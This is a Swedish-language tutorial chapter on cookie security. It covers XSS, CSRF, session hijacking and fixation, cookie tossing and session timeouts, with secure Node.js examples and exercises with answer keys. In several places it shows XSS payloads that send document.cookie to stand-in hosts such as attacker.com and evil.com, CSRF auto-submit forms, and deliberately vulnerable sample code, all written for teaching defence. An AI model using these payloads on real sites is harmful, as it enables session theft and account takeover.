Välkommen till den mest kritiska nivån i denna guide! Nu ska vi utforska de verkliga säkerhetsriskerna med cookies och hur man försvarar sig mot dem. Du kommer att lära dig om reella attackvektorer, förstå hotmodeller, och designa säkra system. Detta är kunskap som är **essentiell** för alla som utvecklar webbapplikationer eller arbetar med säkerhet. Efter denna nivå kommer du att kunna identifiera sårbarheter, förstå deras konsekvenser, och implementera effektiva försvar.

### Kärnkoncept

#### 1. Hotmodell för Cookie-baserade Attacker

Innan vi dyker in i specifika attacker måste vi förstå **hotmodellen** – vilka hot vi står inför och vad angripare kan åstadkomma.

**Angriparens mål med cookies:**
1. **Stjäla sessions-ID** → Kapra användares sessioner
2. **Manipulera cookies** → Ändra användardata eller privilegier
3. **Spåra användare** → Samla in integritetskänslig information
4. **Utföra obehöriga aktioner** → Få användaren att göra saker de inte vill

**Attackytor (där cookies är sårbara):**

```
+------------------+--------------------------------+-------------------------+
| ATTACKYTA        | SÅRBARHET                      | ANGRIPARENS FÖRMÅGA     |
+------------------+--------------------------------+-------------------------+
| JavaScript       | Saknar HttpOnly                | Stjäla cookie via XSS   |
| Nätverkskanal    | Saknar Secure                  | Avlyssna över HTTP      |
| Cross-site       | Saknar SameSite                | CSRF-attacker           |
| Subdomäner       | Felaktig Domain                | Cookie injection        |
| Session-ID       | Svag generering                | Gissa/bruteforce        |
| Livstid          | För lång Max-Age               | Replay-attacker         |
+------------------+--------------------------------+-------------------------+
```

**CIA-triaden för cookies:**
- **Confidentiality (Konfidentialitet)**: Cookies ska inte exponeras för obehöriga
- **Integrity (Integritet)**: Cookies ska inte kunna manipuleras
- **Availability (Tillgänglighet)**: Legitima cookies ska fungera när de behövs

#### 2. XSS (Cross-Site Scripting) och Cookie-stöld

**XSS** är en av de farligaste sårbarheterna för cookies. Den tillåter angripare att köra godtycklig JavaScript i offrets webbläsare.

**Hur XSS fungerar:**

```javascript
// Sårbar kod på server (Node.js exempel)
app.get('/search', (req, res) => {
  const query = req.query.q;
  // SÅRBART: Ingen sanitering!
  res.send(`<h1>Sökresultat för: ${query}</h1>`);
});
```

**Attackscenario:**

```
1. Angriparen skapar en skadlig URL:
   https://vulnerable-site.com/search?q=<script>
   document.location='https://attacker.com/steal?cookie='+document.cookie
   </script>

2. Offret klickar på länken (t.ex. från email eller sociala medier)

3. Den skadliga scripten körs i offrets webbläsare

4. JavaScript läser document.cookie och skickar till angriparen

5. Angriparen har nu offrets session-cookie!
```

**Tre typer av XSS:**

**Reflected XSS (Reflekterad):**
- Skadlig kod kommer från request (t.ex. URL-parameter)
- Körs direkt i response
- Kräver att offret klickar på en skadlig länk

**Stored XSS (Lagrad):**
- Skadlig kod lagras i databasen (t.ex. kommentar, profil)
- Körs varje gång någon läser den lagrade datan
- Mer farlig – drabbar många användare automatiskt

**DOM-based XSS:**
- Skadlig kod manipulerar DOM direkt i webbläsaren
- Servern involverad inte
- JavaScript på sidan hanterar user input osäkert

**Exempel på Cookie-stöld via XSS:**

```html
<!-- Angriparen postar denna "kommentar" på ett forum -->
<img src=x onerror="
  fetch('https://attacker.com/log?cookie=' + document.cookie);
">

<!-- När andra användare läser kommentaren körs scripten -->
```

**Konsekvenser:**
- Angriparen stjäl session-cookie
- Angriparen kan logga in som offret
- Fullständig kontoövertagning
- Åtkomst till känslig information
- Möjlighet att utföra aktioner som offret

**Försvar mot XSS:**

**1. HttpOnly-flaggan (KRITISKT!):**
```
Set-Cookie: session=abc123; HttpOnly
```
- JavaScript kan INTE läsa cookien
- Även om XSS existerar, kan angripare inte stjäla cookien via `document.cookie`
- **ALLTID** använd för sessions- och autentiseringscookies

**2. Input Validation & Output Encoding:**
```javascript
// Sanitera input
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Sökresultat för: ${query}</h1>`);
});
```

**3. Content Security Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
- Blockerar inline scripts
- Tillåter endast scripts från betrodda källor
- Extra försvarslager

**4. Använd moderna ramverk:**
- React, Vue, Angular escapar automatiskt
- Använd deras built-in skydd
- Undvik `dangerouslySetInnerHTML` och liknande

#### 3. CSRF (Cross-Site Request Forgery)

**CSRF** utnyttjar att webbläsare **automatiskt** skickar cookies till domänen, även från andra webbplatser.

**Hur CSRF fungerar:**

```
1. Offret är inloggad på bank.com (har aktiv session-cookie)

2. Offret besöker attacker.com (av misstag)

3. attacker.com innehåller dold form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker-account">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>

4. Formuläret submittas automatiskt till bank.com

5. Webbläsaren skickar sessions-cookien automatiskt!

6. Banken tror det är en legitim begäran från offret

7. Pengarna överförs till angriparen
```

**Konkret exempel:**

```html
<!-- På angriparens sida: evil-site.com -->
<html>
<body>
  <h1>Kolla på dessa söta kattbilder!</h1>

  <!-- Dold CSRF-attack -->
  <img src="https://bank.com/transfer?to=attacker&amount=10000"
       style="display:none">

  <!-- Eller med JavaScript -->
  <script>
    fetch('https://bank.com/api/transfer', {
      method: 'POST',
      credentials: 'include', // Skickar cookies
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        to: 'attacker-account',
        amount: 10000
      })
    });
  </script>
</body>
</html>
```

**Varför fungerar detta?**
- Webbläsaren skickar **automatiskt** alla cookies till bank.com
- Servern ser en request med giltig session-cookie
- Servern vet inte att requesten kom från evil-site.com

**Försvar mot CSRF:**

**1. SameSite Cookie-attribut (BÄST!):**

```
Set-Cookie: session=abc123; SameSite=Lax; HttpOnly; Secure
```

**SameSite=Lax** (Rekommenderat för de flesta fall):
- Blockerar cookies vid cross-site POST, PUT, DELETE
- Tillåter cookies vid navigation (klicka länkar)
- Standard i moderna webbläsare (2024)
- 99% skydd mot CSRF

**SameSite=Strict** (Maximal säkerhet):
- Blockerar cookies vid ALL cross-site användning
- Kan påverka användarupplevelsen (t.ex. länk från email)
- Använd för extra känsliga applikationer

**Jämförelse:**

| Scenario | Lax | Strict |
|----------|-----|--------|
| Användare klickar länk från email till din app | ✓ Cookie skickas | ✗ Cookie blockeras |
| CSRF-attack via formulär POST från annan sajt | ✗ Cookie blockeras | ✗ Cookie blockeras |
| CSRF-attack via JavaScript fetch från annan sajt | ✗ Cookie blockeras | ✗ Cookie blockeras |

**2. CSRF Tokens (Synkronisera tokens):**

```javascript
// Server genererar unikt token per session
app.get('/form', (req, res) => {
  const csrfToken = generateSecureToken(); // Kryptografiskt säkert
  req.session.csrfToken = csrfToken;
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${csrfToken}">
      <input name="to" placeholder="Mottagare">
      <input name="amount" placeholder="Belopp">
      <button>Överför</button>
    </form>
  `);
});

// Server validerar token vid submission
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // Utför överföring...
});
```

**Varför fungerar detta?**
- Token är unikt per session
- Angriparen kan inte gissa eller läsa token (Same-Origin Policy)
- Request utan korrekt token avvisas

**3. Double Submit Cookie:**

```javascript
// Sätt ett random CSRF-token i cookie OCH kräv det i request
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = generateSecureToken();
    res.cookie('csrfToken', token);
  }
  next();
});

// Frontend måste läsa cookien och inkludera i request
// fetch('/api/transfer', {
//   headers: { 'X-CSRF-Token': getCookie('csrfToken') },
//   ...
// })

app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];

  if (cookieToken !== headerToken) {
    return res.status(403).send('CSRF validation failed');
  }
  // Utför överföring...
});
```

**4. Verifiera Origin/Referer headers:**

```javascript
app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://bank.com', 'https://www.bank.com'];

  if (!allowedOrigins.includes(origin)) {
    return res.status(403).send('Invalid origin');
  }
  // Fortsätt...
});
```

**Obs:** Referer/Origin kan saknas i vissa fall, så detta bör användas som extra lager, inte ensam.

**5. Kräv re-autentisering för känsliga åtgärder:**

```javascript
app.post('/api/delete-account', (req, res) => {
  // Kräv att användaren skriver sitt lösenord igen
  if (!verifyPassword(req.body.password, req.user)) {
    return res.status(401).send('Password required');
  }
  // Ta bort konto...
});
```

#### 4. Session Hijacking (Sessionskapning)

**Session Hijacking** är när en angripare stjäl eller gissar en användares session-ID och använder det för att logga in som användaren.

**Attackvektorer:**

**1. Session Sniffing (Nätverksavlyssning):**

```
Användare → HTTP → Server
    ↓
 Angripare (lyssnar på nätverket)

Cookie: session_id=abc123
```

Om cookies skickas över **osakert HTTP** kan angripare avlyssna:
- Öppna WiFi-nätverk
- Man-in-the-middle attacker
- Komprometterade routrar

**Försvar:**
```
Set-Cookie: session=abc123; Secure
```
- `Secure` kräver HTTPS
- HTTPS krypterar all trafik
- Angripare kan inte läsa cookien

**2. Session Fixation:**

Session fixation är när angriparen **sätter** offrets session-ID innan autentisering.

```
1. Angriparen får ett session-ID från servern: SID=attacker123

2. Angriparen lurar offret att använda detta SID:
   https://bank.com/?sessionid=attacker123

3. Servern sätter cookien: Set-Cookie: sessionid=attacker123

4. Offret loggar in med sitt användarnamn/lösenord

5. Servern authentiserar men BEHÅLLER samma session-ID!

6. Angriparen använder attacker123 och är nu inloggad som offret
```

**Försvar:**

```javascript
// REGENERERA session-ID efter lyckad inloggning!
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);

  if (user) {
    // KRITISKT: Skapa NYT session-ID
    req.session.regenerate((err) => {
      req.session.userId = user.id;
      res.send('Logged in successfully');
    });
  }
});
```

**Nyckelprincip:** **ALLTID** regenerera session-ID vid privilege-ändringar:
- Efter inloggning
- Efter utloggning
- Efter password-ändring
- Efter rättighetseskalering

**3. Predicable Session IDs (Förutsägbara session-ID):**

```javascript
// DÅLIGT: Svaga session-IDs
let sessionCounter = 1000;
function generateSessionId() {
  return 'session_' + sessionCounter++; // session_1001, session_1002, etc.
}

// Angriparen kan gissa: session_1000, session_1001, session_1002...
```

**Försvar:**

```javascript
// BRA: Kryptografiskt säkra session-IDs
const crypto = require('crypto');

function generateSessionId() {
  // 128 bitar av kryptografiskt säker slumpmässighet
  return crypto.randomBytes(16).toString('hex');
  // Exempel: "8f4d3c2a1b9e7f6d5c4b3a2e1f0d9c8b"
}
```

**OWASP-rekommendation:**
- Minst **128 bitar** entropi
- Kryptografiskt säker slumptalsgenerator (CSPRNG)
- Omöjligt att gissa eller beräkna

**4. Session Sidejacking (XSS-relaterat):**

Om `HttpOnly` saknas kan XSS stjäla session-cookien:

```javascript
// XSS payload
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie // Stjäl alla cookies!
  });
</script>
```

**Försvar:**
- `HttpOnly` på alla sessions-cookies
- Eliminera XSS-sårbarheter

#### 5. Cookie Tossing (Cookie Injection)

**Cookie Tossing** är en avancerad attack där angripare utnyttjar subdomäner för att **överskriva** eller **injekta** cookies.

**Hur det fungerar:**

```
Du har:
- main-app.example.com (huvudapplikation)
- blog.example.com (blogg, kanske sårbar)

Angriparen komprometterar blog.example.com och sätter:
Set-Cookie: admin=true; Domain=.example.com

Nu har användaren två admin-cookies:
1. admin=false (från main-app.example.com)
2. admin=true (från blog.example.com)

Webbläsaren skickar BÅDA cookies till main-app.example.com:
Cookie: admin=false; admin=true

Om applikationen läser den FÖRSTA eller SISTA osäkert kan angriparen
eskalera privilegier!
```

**Konkret exempel:**

```javascript
// Sårbar kod
app.use((req, res, next) => {
  // Tar första värdet av admin-cookie
  req.user.isAdmin = req.cookies.admin === 'true';
  next();
});

// Angriparen från evil.example.com sätter:
Set-Cookie: admin=true; Domain=.example.com; Path=/

// Nu tror huvudappen att användaren är admin!
```

**Försvar:**

**1. Använd `__Host-` prefix (BÄST!):**

```
Set-Cookie: __Host-session=abc123; Secure; Path=/; HttpOnly
```

`__Host-` prefix kräver:
- `Secure` måste vara satt
- `Path=/` måste vara satt
- INGEN `Domain` får sättas (endast exakt domän)

Detta förhindrar att subdomäner kan överskriva cookien!

**2. Använd `__Secure-` prefix:**

```
Set-Cookie: __Secure-token=xyz789; Secure; HttpOnly
```

Kräver `Secure` men tillåter `Domain` och `Path`.

**3. Validera cookies serversidan:**

```javascript
app.use((req, res, next) => {
  const session = req.cookies.__Host_session;

  // Verifiera signatur/MAC
  if (!verifySessionSignature(session)) {
    return res.status(401).send('Invalid session');
  }

  next();
});
```

**4. Isolera subdomäner:**

Använd **inte** samma cookie-scope för olika säkerhetsnivåer:
- Huvudapp: `app.example.com` (ingen Domain-attribut)
- Blogg: `blog.example.com` (separat cookie-scope)

#### 6. Session Timeout och Livstidshantering

**Problem:** För långa session-timeouts ökar attackytan.

**Risker:**
- Session-cookie kan stjälas långt efter offret lämnat datorn
- Större tidsfönster för session hijacking
- Övergivna sessioner kan återanvändas

**Best Practices:**

**1. Idle Timeout (Inaktivitetstimeout):**

```javascript
app.use((req, res, next) => {
  const session = req.session;
  const now = Date.now();
  const maxIdleTime = 30 * 60 * 1000; // 30 minuter

  if (session.lastActivity && (now - session.lastActivity > maxIdleTime)) {
    req.session.destroy();
    return res.status(401).send('Session expired due to inactivity');
  }

  session.lastActivity = now;
  next();
});
```

**2. Absolute Timeout (Absolut timeout):**

```javascript
app.use((req, res, next) => {
  const session = req.session;
  const now = Date.now();
  const maxSessionTime = 12 * 60 * 60 * 1000; // 12 timmar

  if (session.createdAt && (now - session.createdAt > maxSessionTime)) {
    req.session.destroy();
    return res.status(401).send('Session expired');
  }

  if (!session.createdAt) {
    session.createdAt = now;
  }

  next();
});
```

**3. Cookie Max-Age:**

```
Set-Cookie: session=abc; Max-Age=3600; HttpOnly; Secure; SameSite=Lax
```

**Rekommenderade timeouts (OWASP):**

| Applikationstyp | Idle Timeout | Absolute Timeout |
|----------------|--------------|------------------|
| Hög säkerhet (bank) | 10-15 min | 30 min - 1 h |
| Medium säkerhet (ecommerce) | 30-60 min | 12-24 h |
| Låg säkerhet (nyheter) | 60+ min | 7-30 dagar |

**4. "Remember Me"-funktionalitet:**

```javascript
// Separat långlivad cookie (inte sessions-cookie!)
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);

  if (user) {
    // Session-cookie (kort livstid)
    req.session.userId = user.id;

    // Om "Remember Me" är vald
    if (req.body.rememberMe) {
      const rememberToken = generateSecureToken();
      await storeRememberToken(user.id, rememberToken);

      // Separat långlivad cookie
      res.cookie('remember_token', rememberToken, {
        maxAge: 30 * 24 * 60 * 60 * 1000, // 30 dagar
        httpOnly: true,
        secure: true,
        sameSite: 'lax'
      });
    }
  }
});

// Validera remember token
app.use(async (req, res, next) => {
  if (!req.session.userId && req.cookies.remember_token) {
    const user = await validateRememberToken(req.cookies.remember_token);
    if (user) {
      req.session.regenerate(() => {
        req.session.userId = user.id;
        next();
      });
    } else {
      res.clearCookie('remember_token');
      next();
    }
  } else {
    next();
  }
});
```

**Nyckelprinciper:**
- Remember-token är INTE samma som session-cookie
- Lagra remember-tokens hashat i databas
- Rotera tokens regelbundet
- Tillåt användare att revokera alla remember-tokens

### Sammanfattande Försvarstabeller

#### Defense-in-Depth: Lager av försvar

```
+------------------------+------------------------------------------+
| LAGER                  | FÖRSVARSMEKANISM                         |
+------------------------+------------------------------------------+
| Cookie-attribut        | HttpOnly, Secure, SameSite, __Host-      |
| Session-generering     | CSPRNG, 128+ bitar, regenerering         |
| Applikationslogik      | CSRF-tokens, input validation            |
| Timeout-hantering      | Idle timeout, absolute timeout           |
| Nätverksskydd         | HTTPS, HSTS                              |
| Content Security       | CSP headers                              |
| Ramverk               | Använd beprövade libraries               |
| Monitoring            | Logga sessions, upptäck anomalier        |
+------------------------+------------------------------------------+
```

#### OWASP Session Management Checklist

**✓ Checklist för säkra cookie-baserade sessioner:**

```
Session-ID Generation:
☐ Använd kryptografiskt säker slumpgenerator (crypto.randomBytes)
☐ Minst 128 bitar entropi
☐ Unik per användare och session
☐ Omöjlig att förutsäga

Cookie-attribut:
☐ HttpOnly – ALLTID för sessions-cookies
☐ Secure – ALLTID i produktion
☐ SameSite=Lax (minimum) eller Strict
☐ __Host- prefix när möjligt
☐ Lämplig Max-Age/Expires

Session Lifecycle:
☐ Regenerera session-ID vid inloggning
☐ Regenerera session-ID vid privilege-ändringar
☐ Förstör session vid utloggning
☐ Implementera idle timeout
☐ Implementera absolute timeout
☐ Tillåt användare att se aktiva sessioner
☐ Tillåt användare att revokera sessioner

Transport Security:
☐ Använd HTTPS överallt
☐ HSTS header
☐ Ingen mixed content

Input/Output:
☐ Validera och sanitera all user input
☐ Escape output för att förhindra XSS
☐ Använd parametriserade queries (förhindra SQL injection)

CSRF-skydd:
☐ SameSite-attribut på cookies
☐ CSRF-tokens för state-changing requests
☐ Verifiera Origin/Referer headers

Monitoring:
☐ Logga session creation
☐ Logga session destruction
☐ Logga failed authentication attempts
☐ Alert på misstänkta mönster
```

### 💡 Pro Tips

**Pro Tip 1: Defense-in-Depth är nyckeln**
Förlita dig ALDRIG på endast ett försvarslager. Använd `HttpOnly` OCH `Secure` OCH `SameSite` OCH CSRF-tokens. Om ett lager bryts ska andra fortfarande skydda.

**Pro Tip 2: Utveckla med säkerhet från start**
Det är mycket svårare att lägga till säkerhet efteråt. Inkludera säkra cookie-attribut från dag 1. Använd ramverk som har säkerhet inbyggt (Express med helmet, Django med CSRF-skydd, etc.).

**Pro Tip 3: Session-ID är som lösenord**
Behandla session-IDs med samma försiktighet som lösenord. De ger fullständig åtkomst till användarkontot. Logga dem ALDRIG, skicka dem ALDRIG via osäkra kanaler, och rotera dem regelbundet.

**Pro Tip 4: Testa dina försvar**
Använd verktyg som OWASP ZAP, Burp Suite, eller browser DevTools för att verifiera att dina cookies har rätt attribut. Skriv automatiska tester som kontrollerar säkerhetskonfigurationen.

**Pro Tip 5: Håll dig uppdaterad**
Säkerhet är ett rörligt mål. Nya attacker upptäcks regelbundet. Följ OWASP, läs säkerhetsrapporter, och uppdatera dina försvar baserat på nya hot.

### Praktiska Projekt

#### Projekt 1: Säker Login-implementering

**Mål:** Implementera en komplett säker inloggning med session-hantering.

**Krav:**
1. Säkra cookie-attribut (`HttpOnly`, `Secure`, `SameSite`, `__Host-`)
2. Session-ID regenerering vid login
3. CSRF-skydd med tokens
4. Idle och absolute timeouts
5. Password hashing (bcrypt/argon2)
6. Rate limiting på login-försök

**Exempel (Node.js/Express):**

```javascript
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const bcrypt = require('bcrypt');

const app = express();

// Session middleware med säkra inställningar
app.use(session({
  name: '__Host-session', // Använd __Host- prefix
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true, // Kräver HTTPS
    sameSite: 'strict',
    maxAge: 3600000 // 1 timme
  },
  genid: () => crypto.randomBytes(16).toString('hex')
}));

// CSRF token middleware
app.use((req, res, next) => {
  if (req.method === 'GET' && req.session) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Login route
app.post('/login', async (req, res) => {
  const { username, password, csrfToken } = req.body;

  // CSRF-skydd
  if (csrfToken !== req.session.csrfToken) {
    return res.status(403).send('CSRF validation failed');
  }

  // Hitta användare
  const user = await findUserByUsername(username);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).send('Invalid credentials');
  }

  // REGENERERA session-ID (förhindra session fixation)
  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Error');

    req.session.userId = user.id;
    req.session.createdAt = Date.now();
    req.session.lastActivity = Date.now();

    res.send('Login successful');
  });
});

// Auth middleware med timeout-hantering
app.use((req, res, next) => {
  if (!req.session.userId) return next();

  const now = Date.now();
  const idleTimeout = 30 * 60 * 1000; // 30 min
  const absoluteTimeout = 12 * 60 * 60 * 1000; // 12 h

  // Check idle timeout
  if (now - req.session.lastActivity > idleTimeout) {
    return req.session.destroy(() => {
      res.status(401).send('Session expired (idle)');
    });
  }

  // Check absolute timeout
  if (now - req.session.createdAt > absoluteTimeout) {
    return req.session.destroy(() => {
      res.status(401).send('Session expired (absolute)');
    });
  }

  req.session.lastActivity = now;
  next();
});

// Logout
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('__Host-session');
    res.send('Logged out');
  });
});
```

#### Projekt 2: SameSite Demo

**Mål:** Demonstrera hur `SameSite` skyddar mot CSRF.

**Setup:**
1. Skapa en "bank"-app på `localhost:3000`
2. Skapa en "attack"-app på `localhost:4000`
3. Testa med olika `SameSite`-värden

**Bank-app (server):**

```javascript
// bank-server.js
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

// Sätt session-cookie med olika SameSite-värden
app.get('/login', (req, res) => {
  const sameSite = req.query.samesite || 'lax';

  res.cookie('bank_session', 'user_12345', {
    httpOnly: true,
    sameSite: sameSite, // none, lax, eller strict
    secure: false // För lokal testning
  });

  res.send(`Logged in with SameSite=${sameSite}`);
});

// Överförings-endpoint
app.post('/transfer', (req, res) => {
  if (!req.cookies.bank_session) {
    return res.status(401).send('Not logged in');
  }

  const { to, amount } = req.body;
  res.send(`Transferred $${amount} to ${to}`);
});

app.listen(3000);
```

**Attack-app:**

```html
<!-- attacker-page.html (serveras från localhost:4000) -->
<html>
<body>
  <h1>CSRF Attack Demo</h1>
  <p>Klicka knappen för att utföra CSRF-attack:</p>

  <form action="http://localhost:3000/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
    <button type="submit">Kolla denna söta katt!</button>
  </form>

  <script>
    // Auto-submit för demo
    // document.forms[0].submit();
  </script>
</body>
</html>
```

**Test:**
1. Gå till `localhost:3000/login?samesite=none` → logga in
2. Gå till `localhost:4000/attacker-page.html`
3. Klicka knappen → ÖVERFÖRING LYCKAS (SameSite=None tillåter cross-site)
4. Upprepa med `samesite=lax` → ÖVERFÖRING BLOCKERAS
5. Upprepa med `samesite=strict` → ÖVERFÖRING BLOCKERAS

Detta demonstrerar kraftfullt hur `SameSite` skyddar mot CSRF!

### ✏️ Övningar

#### Övning 1: Identifiera sårbarheter

Analysera följande kod och identifiera alla säkerhetsbrister:

```javascript
// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (username === 'admin' && password === 'password123') {
    res.cookie('session', '12345');
    res.send('<h1>Welcome ' + username + '!</h1>');
  } else {
    res.send('Login failed');
  }
});

// Transfer endpoint
app.post('/transfer', (req, res) => {
  if (req.cookies.session === '12345') {
    const amount = req.body.amount;
    res.send(`Transferred ${amount}`);
  }
});
```

**Hitta minst 8 säkerhetsbrister!**

<details>
<summary>📖 Visa facit</summary>

**Säkerhetsbrister (10 stycken!):**

1. **XSS-sårbarhet**
   - `'<h1>Welcome ' + username + '!</h1>'` – Användarnamnet escapas inte
   - Angripare kan injektera: `<script>alert('XSS')</script>`

2. **Saknar HttpOnly**
   - Cookie kan stjälas via XSS med `document.cookie`

3. **Saknar Secure**
   - Cookie kan avlyssnas över HTTP

4. **Saknar SameSite**
   - Sårbar för CSRF-attacker

5. **Förutsägbart session-ID**
   - Session-ID är statiskt `'12345'` – alla användare får samma!
   - Angripare kan gissa session-ID

6. **Ingen session-regenerering**
   - Session-ID ändras inte vid inloggning → session fixation

7. **Hardkodat lösenord**
   - `password123` finns i klartext i koden (borde använda database + hashing)

8. **Ingen CSRF-skydd**
   - Transfer-endpoint saknar CSRF-tokens

9. **Ingen timeout**
   - Session lever för alltid (ingen Max-Age)

10. **Ingen input-validering**
    - `amount` valideras inte – kunde vara negativ, text, etc.

**Säker version:**

```javascript
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const escapeHtml = require('escape-html');

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Hämta användare från databas
  const user = await findUser(username);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).send('Invalid credentials');
  }

  // Regenerera session
  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Error');

    req.session.userId = user.id;
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');

    // Säker cookie sätts automatiskt av session middleware
    res.send(`<h1>Welcome ${escapeHtml(username)}!</h1>`);
  });
});

app.post('/transfer', (req, res) => {
  // Verifiera session
  if (!req.session.userId) {
    return res.status(401).send('Not authenticated');
  }

  // CSRF-skydd
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('CSRF validation failed');
  }

  // Validera input
  const amount = parseInt(req.body.amount);
  if (isNaN(amount) || amount <= 0) {
    return res.status(400).send('Invalid amount');
  }

  // Utför överföring...
  res.send(`Transferred ${amount}`);
});

// Session middleware med säkra inställningar
app.use(session({
  name: '__Host-session',
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  },
  genid: () => crypto.randomBytes(16).toString('hex')
}));
```

</details>

#### Övning 2: XSS eller CSRF?

För varje scenario, identifiera om det är en **XSS-attack**, **CSRF-attack**, eller **båda**:

**A)** En angripare lurar användare att klicka på en länk:
```
https://bank.com/search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

**B)** En användare besöker evil.com som innehåller:
```html
<form action="https://bank.com/delete-account" method="POST">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

**C)** En bloggkommentar innehåller:
```html
Kolla denna länk! <img src=x onerror="document.location='https://evil.com/?steal='+document.cookie">
```

**D)** En användare besöker evil.com som innehåller:
```html
<script>
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({to: 'attacker', amount: 1000})
});
</script>
```

<details>
<summary>📖 Visa facit</summary>

**A) XSS-attack** (Reflected XSS)
- Skadlig script i URL-parameter
- När sidan renderar sökningen utan att escapea körs scripten
- Stjäl cookies via `document.cookie`
- **Försvar:** Escape output, HttpOnly på cookies

**B) CSRF-attack**
- Formulär från annan sajt submittas till bank.com
- Användarens session-cookie skickas automatiskt
- Banken tror det är legitim request
- **Försvar:** SameSite på cookies, CSRF-tokens

**C) XSS-attack** (Stored XSS)
- Skadlig kommentar lagras i databas
- Körs när andra läser kommentaren
- Stjäl cookies
- **Försvar:** Sanitera input, escape output, HttpOnly på cookies

**D) CSRF-attack**
- JavaScript från annan sajt gör fetch till bank.com
- `credentials: 'include'` skickar cookies
- **Försvar:** SameSite=Lax/Strict blockerar detta, CSRF-tokens

**Nyckelskillnader:**
- **XSS**: Angriparen kör kod **i** offrets webbläsare på target-sidan
- **CSRF**: Angriparen får offrets webbläsare att skicka requests **från** en annan sida

</details>

#### Övning 3: Session Hijacking-scenarier

För varje scenario, förklara hur session hijacking kan förekomma och hur man försvarar sig:

**A)** Alice loggar in på café-wifi. Bob sitter på samma nätverk med Wireshark.

**B)** En webbapp använder sequentiella session-IDs: sess_1000, sess_1001, sess_1002...

**C)** Angriparen skickar offret en länk: `https://bank.com/login?sessionid=evil123`

**D)** En XSS-sårbarhet existerar och cookies saknar HttpOnly.

<details>
<summary>📖 Visa facit</summary>

**A) Session Sniffing / Man-in-the-Middle**

**Attack:**
- Bob kör Wireshark och fångar all nätverkstrafik
- Om Alice använder HTTP (inte HTTPS) kan Bob läsa session-cookien i klartext
- Bob kopierar session-ID och använder det i sin egen webbläsare
- Bob är nu inloggad som Alice

**Försvar:**
```
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax
```
- `Secure` kräver HTTPS → krypterad trafik
- Implementera HTTPS på hela webbplatsen
- HSTS header för att tvinga HTTPS

**B) Predictable Session IDs**

**Attack:**
- Angriparen skapar konto och får session-ID: sess_1005
- Angriparen gissar att andra users har sess_1004, sess_1006, etc.
- Angriparen testar sess_1006 och får åtkomst till annan användares session

**Försvar:**
```javascript
// Använd kryptografiskt säkra IDs
const crypto = require('crypto');
const sessionId = crypto.randomBytes(16).toString('hex');
// Resultat: "f4e8c2a1d9b7e6f5a4c3b2e1d0c9b8a7"
```
- Minst 128 bitar entropi
- Omöjligt att gissa

**C) Session Fixation**

**Attack:**
1. Angriparen får session-ID från bank.com: `evil123`
2. Angriparen skickar länk till offret: `bank.com/login?sessionid=evil123`
3. Bank sätter cookie: `Set-Cookie: sessionid=evil123`
4. Offret loggar in med användarnamn/lösenord
5. Bank autentiserar UTAN att regenerera session-ID
6. Angriparen använder `evil123` och är nu inloggad som offret

**Försvar:**
```javascript
app.post('/login', (req, res) => {
  if (authenticateUser(req.body)) {
    // REGENERERA session-ID efter lyckad inloggning!
    req.session.regenerate((err) => {
      req.session.userId = user.id;
      res.send('Logged in');
    });
  }
});
```
- Skapa NYT session-ID vid varje privilege-ändring
- Ignorera session-IDs från query parameters

**D) Session Sidejacking via XSS**

**Attack:**
- XSS-sårbarhet tillåter angripare att köra JavaScript
- Cookie saknar HttpOnly
- Angripare's script: `fetch('https://evil.com/?c='+document.cookie)`
- Session-cookie stjäls och skickas till angriparen

**Försvar:**
```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```
- `HttpOnly` → JavaScript kan INTE läsa cookien
- Eliminera XSS-sårbarheter (escape output, CSP)
- Defense-in-depth: båda försvaren tillsammans

</details>

#### Övning 4: Designa säker autentisering

Du ska designa autentiseringen för en ny e-handelsapplikation. Specificera:

1. Cookie-attribut för sessions-cookien
2. Cookie-attribut för "kom ihåg mig"-cookien
